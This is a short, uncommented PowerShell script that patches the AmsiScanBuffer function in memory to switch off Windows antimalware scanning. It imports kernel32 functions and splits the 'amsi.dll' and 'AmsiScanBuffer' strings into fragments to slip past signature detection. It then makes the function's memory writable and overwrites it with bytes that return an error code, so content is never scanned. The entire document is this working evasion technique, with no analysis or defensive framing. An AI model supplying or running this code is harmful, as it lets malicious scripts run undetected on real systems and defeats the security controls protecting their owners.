$MethodDefinition = @"
    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$var = 'am'
$var2 = $var + 'si'
$var3 = $var2 + ".d" + "ll"
$handle = [Win32.Kernel32]::GetModuleHandle($var3);
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'Am'+'siS'+'can'+'Buf'+'fer');
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);

$arr = New-Object Byte[] 6

$arr[0] = [Byte]([UInt32]0xB8)
$arr[1] = [Byte]([UInt32]0x57)
$arr[2] = [Byte]([UInt32]0x00)
$arr[3] = [Byte]([UInt32]0x07)
$arr[4] = [Byte]([UInt32]0x80)
$arr[5] = [Byte]([UInt32]0xC3)

[System.Runtime.InteropServices.Marshal]::Copy($arr, 0, $BufferAddress, $arr.Length);
